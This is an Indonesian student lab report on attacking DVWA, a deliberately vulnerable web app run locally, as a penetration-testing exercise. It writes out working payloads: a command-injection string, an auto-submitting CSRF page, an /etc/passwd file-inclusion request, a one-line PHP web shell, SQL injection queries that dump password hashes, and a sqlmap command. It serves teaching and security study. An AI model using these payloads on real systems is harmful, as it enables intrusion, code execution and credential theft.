# 🛡️ Laporan Praktikum – DVWA (Damn Vulnerable Web Application)
## 1. Informasi Umum

- **Nama Peserta**        : Aria Fatah
- **Tanggal Praktikum**   : 24 Juni 2025
- **Nama Praktikum**      : Web Application Penetration Testing
- **Target Sistem**       : DVWA (Damn Vulnerable Web Application)
- **IP/URL Target**       : [http://localhost:8081](http://localhost:8081)
- **DVWA Security Level** : Low

---

## 2. Tujuan Praktikum
Tujuan dari praktikum ini adalah **mengidentifikasi dan mengeksploitasi kerentanan umum pada aplikasi web**, seperti **XSS, SQL Injection, Command Injection**, dan **CSRF**, menggunakan target vulnerable DVWA.

---

## 3. Tools dan Bahan
- **Tools Utama**:
  - Firefox/Chrome DevTools
  - Burp Suite
  - OWASP ZAP
  - Nmap

- **VM/Lab Environment**:
  - DVWA (Docker container)
  - Kali Linux (attacker machine)

---

## 4. Metodologi Pengujian
Metode pengujian mengacu pada standar **NIST SP 800-115**:

1. **Planning**
2. **Discovery**
3. **Attack**
4. **Reporting**

---

## 5. Langkah-Langkah Praktikum
1. Menjalankan DVWA menggunakan Docker: 
   ```bash
   docker run -d --name dvwa -p 8081:80 vulnerables/web-dvwa
   ```
2. Mengakses aplikasi di browser `http://localhost:8081`
3. Login dengan akun `admin:password`
4. Klik "Create / Reset Database" untuk memulai, dan login kembali
5. Menjalankan scanning port dengan Nmap:
   ```bash
   nmap -sCV -T5 localhost -p 8081 -oN nmap
   ```
   ![alt text](images/01_dvwa/image.png)
6. jangan lupa ubah Security Level menjadi Low

#### 1. Brute Force
- jangan lupa setting scope agar lebih enak interceptnya. (bisa coba add scope dulu di target, lalu setting proxy bagian request dan response AND paling bawah aktifkan)
- Capture request login menggunakan Burp Proxy.
- Kirim ke Intruder.
- Gunakan tipe Cluster Bomb Attack.
- Payload 1: isikan username (admin), Payload 2: list password.
- Gunakan fitur Grep - Match, tambahkan teks yang muncul saat login berhasil (misal: Welcome to the password protected area).
- Jalankan Start Attack (Simple).
![alt text](images/01_dvwa/image-1.png)

#### 2. Command Injection
- saya mencoba melkukan ping ke alamat ip 8.8.8.8
  ![alt text](images/01_dvwa/image-2.png)
- lalu saya coba lakukan command injection
  ```bash
  8.8.8.8> /dev/null 2>&1; ls
  ```
  ![alt text](images/01_dvwa/image-3.png)

### 3. Cross Site Request Forgery (CSRF)
- source code:
  ```php
  <?php
  if( isset( $_GET[ 'Change' ] ) ) {
      // Get input
      $pass_new  = $_GET[ 'password_new' ];
      $pass_conf = $_GET[ 'password_conf' ];

      // Do the passwords match?
      if( $pass_new == $pass_conf ) {
          // They do!
          $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
          $pass_new = md5( $pass_new );

          // Update the database
          $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
          $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

          // Feedback for the user
          echo "<pre>Password Changed.</pre>";
      }
      else {
          // Issue with passwords matching
          echo "<pre>Passwords did not match.</pre>";
      }

      ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
  }
  ?> 
  ```
- buat file post form ke alamat ip dvwa
  ```bash
  <!DOCTYPE html>
  <html>
    <body onload="document.forms[0].submit()">
      <form action="http://[DVWA-IP]/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="hacked123">
        <input type="hidden" name="password_conf" value="hacked123">
        <input type="hidden" name="Change" value="Change">
      </form>
    </body>
  </html>
  ```
- Jalankan HTTP server menggunakan Python:
  ```bash
  python3 -m http.server
  ```
  ![alt text](images/01_dvwa/image-10.png)
- Jika ada client yang sudah login ke web DVWA, lalu membuka website yang disajikan melalui HTTP server ini, maka client tersebut bisa terkena serangan CSRF. Hal ini terjadi karena browser secara otomatis mengirimkan cookie yang masih aktif ke DVWA saat permintaan (request) dikirim oleh website dari HTTP server tersebut.
- Dengan cara ini, kamu berhasil mengubah password admin melalui serangan CSRF.
  ![alt text](images/01_dvwa/image-11.png)

- Ringkasan CSRF (Cross-Site Request Forgery): \
  Terjadi ketika:
  - Korban masih dalam keadaan login ke situs target.
  - Penyerang membuat situs atau halaman berisi permintaan palsu ke situs target.
  - Permintaan tersebut dianggap sah oleh server karena disertai cookie korban yang masih aktif.

### 4. File Inclusion
- buka webnya dan coba buka page File 1
  ![alt text](images/01_dvwa/image-8.png)
- terdapat paramter page, lalu kita coba beberapa path untuk LFI seperti /etc/passwd
  ```http://localhost:8081/vulnerabilities/fi/?page=/etc/passwd```
  ![alt text](images/01_dvwa/image-12.png)

### 5. File Upload
- buka webnya dan coba buka page File Upload
- lalu coba upload file php RCE
  ```php
  <?=`$_GET[p]`?>
  ``` 
- lalu buka urlnya, dan ingat sesuaikan p itu sesuai dengan yang kita paramter kita inginkan, lalu upload filenya
  ![alt text](images/01_dvwa/image-9.png)
- setelah di upload buka path ini dan buka filenya, 
  ````http://127.0.0.1:8081/hackable/uploads/```
  ![alt text](images/01_dvwa/image-13.png)
- lalu buka file php yang telah di upload, dan tambahkan parameter ?p=[command]
  ![alt text](images/01_dvwa/image-14.png)
- kita telah berhasil mendapatkan RCE

### 6. SQL Injection
- test parameter 1
  ![alt text](images/01_dvwa/image-4.png)
- test payload sql injection
  ```' OR 1 = 1 #```
  ![alt text](images/01_dvwa/image-5.png)
- kita bisa mendapatkan semua data user
- kita coba mencari passowrdnya dengan payload
  ```' UNION SELECT user, password FROM users #```
  ![alt text](images/01_dvwa/image-6.png)
- lalu decode menggunakan crackstation / cyberchef
  ![alt text](images/01_dvwa/image-7.png)

### 7. SQL Injection (Blind)
- buka web sql injection blind, dan coba lakukan dengan sqlmap
  ```sqlmap -u "http://<IP_Server>/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=hash; security=low" --dbs```
  ![alt text](images/01_dvwa/image-15.png)
  ![alt text](images/01_dvwa/image-16.png)

### 10. DOM Based Cross Site Scripting (XSS)
- 

### 11. Reflected Cross Site Scripting (XSS)
- 

### 12. Reflected Cross Site Scripting (XSS)
- 

---

## 6. Temuan dan Analisis

| No | Jenis Kerentanan  | Deskripsi Temuan                  | Dampak                         | Bukti                    |
| -- | ----------------- | --------------------------------- | ------------------------------ | ------------------------ |
| 1  | SQL Injection     | Parameter `id` tidak divalidasi   | Akses database tanpa otorisasi | gambar |

---

## 7. Rekomendasi Perbaikan

- Gunakan **prepared statement** untuk semua query SQL

---

## 8. Evaluasi dan Refleksi
- **Tantangan Utama:**
  Memahami bagaimana payload yang sederhana dapat mengeksploitasi celah keamanan di aplikasi web.
- **Tools yang Tidak Sesuai Ekspektasi:**
  OWASP ZAP tidak berhasil menangkap semua request karena konfigurasi proxy belum disesuaikan dengan benar.
- **Pelajaran Penting:**
  Validasi input adalah pertahanan utama dalam pengembangan aplikasi web yang aman. Selain itu, penggunaan tools seperti Burp Suite sangat membantu dalam identifikasi kerentanan.

---

## 9. Lampiran

> 📎 Sertakan screenshot berikut (dapat ditambahkan sebagai gambar markdown atau file terpisah):

- SQL Injection (screenshot request & response)
  IMG
- XSS pop-up
- Command Injection output
- CSRF exploit HTML
- Hasil scan Nmap (log atau screenshot)